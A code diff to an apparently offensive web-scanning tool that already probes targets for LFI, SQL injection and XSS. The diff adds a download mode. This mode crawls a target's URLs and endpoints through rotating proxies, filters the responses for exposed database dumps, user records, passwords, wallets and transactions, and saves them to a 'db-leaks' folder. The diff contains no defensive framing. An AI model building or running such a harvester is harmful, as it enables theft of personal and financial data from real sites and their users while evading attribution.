@@ -20,6 +20,7 @@ FLAG_LFI = "--lfi" in sys.argv
 FLAG_SQLI = "--sqli" in sys.argv
 FLAG_XSS = "--xss" in sys.argv
 FLAG_KIRPICH = "--kirpich" in sys.argv
+FLAG_DOWNLOAD = "--download" in sys.argv
 
 LFI_NAMES = ("file", "path", "page", "template", "doc", "include", "lang", "dir", "folder", "style", "theme", "load", "read", "url", "filename", "filepath")
 LFI_PAYLOADS = (
@@ -520,5 +521,172 @@ def main():
         if e:
             print(h, "->", len(e))
 
+
+def _target_name():
+    return HOSTS[0].replace(".com", "").replace(".pl", "").replace(".net", "").replace(".io", "").replace(".", "_")
+
+# ════════════════════════════════════════════════════════
+# ПРАВИЛА СКАЧИВАНИЯ ОТКРЫТЫХ ДАННЫХ (БЕЗ МУСОРА)
+# Качаем ТОЛЬКО то, что выглядит как данные БД/API:
+#   - Content-Type: json / csv / sql / txt-дамп / xlsx
+#   - размер > 2 КБ (мелкие = SPA-фолбэки/пустые)
+#   - НЕ качаем: html-фолбэки SPA (ровно 715 б у IIS), image, css, js-min
+# ════════════════════════════════════════════════════════
+
+# Content-Type, которые считаем данными
+DATA_CONTENT_TYPES = ("json", "csv", "sql", "xlsx", "xls", "xml", "txt", "plain", "octet-stream", "zip", "gz", "yaml", "yml")
+# Расширения файлов данных
+DATA_EXTS = (".json", ".csv", ".sql", ".xlsx", ".xls", ".xml", ".txt", ".zip", ".gz", ".yaml", ".yml", ".db", ".sqlite", ".bak", ".dump", ".dat")
+# Расширения, которые НИКОГДА не качаем (мусор)
+SKIP_EXTS = (".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2", ".ttf", ".eot", ".map", ".min.js")
+# Признаки данных в теле (JSON-массивы/объекты, строки БД)
+DATA_HINTS = ('"rows"', '"data"', '"records"', '"result"', '"items"', '"clients"', '"users"', '"transactions"',
+              '"withdrawal"', '"deposit"', '"wallet"', '"balance"', '"_id"', '"id":', '"email"', '"password"',
+              '"amount"', '"total"', '"created_at"', '"updated_at"', 'INSERT INTO', 'CREATE TABLE', 'DROP TABLE')
+MIN_DATA_SIZE = 2048  # байт — меньше этого качать нечего
+# Точные размеры SPA-фолбэков (IIS возвращает одинаковый index.html) — пропускаем
+SPA_FALLBACK_SIZE = 715  # известный размер фолбэка testadmin/eedmin
+
+
+def _is_data_candidate(url, content_type, size, body_head):
+    """Правило: качать ли этот ответ как данные."""
+    from urllib.parse import urlparse
+    p = urlparse(url)
+    path = p.path.lower()
+    # 1) явный мусор по расширению
+    if path.endswith(SKIP_EXTS):
+        return False
+    # 2) SPA-фолбэк (известный размер)
+    if size and abs(size - SPA_FALLBACK_SIZE) < 3:
+        return False
+    # 3) слишком мелко
+    if size and size < MIN_DATA_SIZE:
+        return False
+    # 4) расширение данных — качаем
+    if path.endswith(DATA_EXTS):
+        return True
+    # 5) Content-Type данных
+    if content_type and any(dt in content_type for dt in DATA_CONTENT_TYPES) and "html" not in content_type:
+        return True
+    # 6) JSON-подобное тело (объект/массив) с признаками данных
+    if body_head:
+        bh = body_head[:2000].lstrip().lower()
+        if bh.startswith(("{", "[")) and any(h in bh for h in ("\"id\"", "\"data\"", "\"rows\"", "\"result\"", "\"users\"", "\"email\"", "\"amount\"")):
+            return True
+    return False
+
+
+def run_download():
+    import shutil
+    target_name = _target_name()
+    base_dir = f"/root/office/db-leaks/{target_name}"
+    os.makedirs(base_dir, exist_ok=True)
+    seen = set()
+    downloaded = 0
+    # 1) все собранные URL (если есть файл)
+    url_file = f"/root/office/output/{target_name}_spider_urls.txt"
+    candidates = []
+    if os.path.exists(url_file):
+        for line in open(url_file):
+            parts = line.rstrip("\n").split("\t", 1)
+            if len(parts) == 2 and parts[0] == "200":
+                candidates.append(parts[1])
+    # 2) главные страницы хостов
+    for h in HOSTS:
+        candidates.append(f"https://{h}/")
+    # 3) JS-бандлы из собранного
+    js_file = f"/root/office/output/{target_name}_spider_js.txt"
+    if os.path.exists(js_file):
+        candidates += [l.strip() for l in open(js_file) if l.strip()]
+    # 4) эндпоинты ABET (если есть)
+    for ep_file in ("/root/office/output/abet_endpoints.txt", "/root/office/output/abet_endpoints2.txt"):
+        if os.path.exists(ep_file):
+            for line in open(ep_file):
+                ep = line.strip()
+                if ep.startswith("/"):
+                    for h in HOSTS[:2]:
+                        candidates.append(f"https://{h}{ep}")
+
+    candidates = list(dict.fromkeys(candidates))
+    print(f"[download] кандидатов на скачивание: {len(candidates)}", flush=True)
+    with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
+        futs = {}
+        for u in candidates:
+            if u in seen:
+                continue
+            seen.add(u)
+            futs[ex.submit(_download_one, u, base_dir)] = u
+        for fu in cf.as_completed(futs):
+            u = futs[fu]
+            try:
+                name, size = fu.result()
+                if name:
+                    downloaded += 1
+                    print(f"[download] OK {u} -> {name} ({size} б)", flush=True)
+            except Exception as e:
+                print(f"[download] FAIL {u}: {e}", flush=True)
+    print(f"\n[download] ИТОГО скачано: {downloaded} файлов -> {base_dir}", flush=True)
+
+
+def _download_one(url, base_dir):
+    """Скачать URL если в доступе (200) И это данные (по правилам _is_data_candidate).
+    Без мусора: SPA-фолбэки, css, картинки, мелкие html — пропускаются.
+    Возвращает (имя_файла, размер)."""
+    import hashlib
+    for _try in range(3):
+        proxy = next_proxy()
+        try:
+            r = requests.get(url, proxies=proxy, headers={"User-Agent": UA,
+                "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9"}, verify=False,
+                timeout=TIMEOUT, allow_redirects=True, stream=True)
+            if r.status_code != 200:
+                return (None, 0)
+            ct = (r.headers.get("Content-Type") or "").lower()
+            # читаем первые 64 КБ для проверки
+            head = r.raw.read(65536)
+            total = len(head)
+            if not _is_data_candidate(url, ct, total, head.decode("utf-8", "replace")):
+                r.close()
+                return (None, 0)
+            # имя файла: хост + хэш + расширение по пути/контенту
+            from urllib.parse import urlparse
+            p = urlparse(url)
+            host = p.netloc.replace(":", "_")
+            path = p.path.rstrip("/") or "/index"
+            if path.endswith(DATA_EXTS):
+                ext = os.path.splitext(path)[1]
+            elif "json" in ct:
+                ext = ".json"
+            elif "csv" in ct:
+                ext = ".csv"
+            elif "sql" in ct:
+                ext = ".sql"
+            else:
+                ext = ".dat"
+            h = hashlib.md5(url.encode()).hexdigest()[:10]
+            fname = f"{host}__{h}{ext}"
+            fpath = os.path.join(base_dir, fname)
+            with open(fpath, "wb") as f:
+                f.write(head)
+                for chunk in r.iter_content(65536):
+                    f.write(chunk)
+                    total += len(chunk)
+                    if total > 10_000_000:  # лимит 10 МБ на файл
+                        break
+            r.close()
+            return (fname, total)
+        except Exception:
+            continue
+    return (None, 0)
+
 if __name__ == "__main__":
-    main()
+    if FLAG_DOWNLOAD:
+        run_download()
+    else:
+        main()
+
+
+# ════════════════════════════════════════════════════════
+# РЕЖИМ СКАЧИВАНИЯ: если URL в доступе (200) — качаем файл
+# Запуск: python3 abet_spider.py --download <хосты>
+# ════════════════════════════════════════════════════════
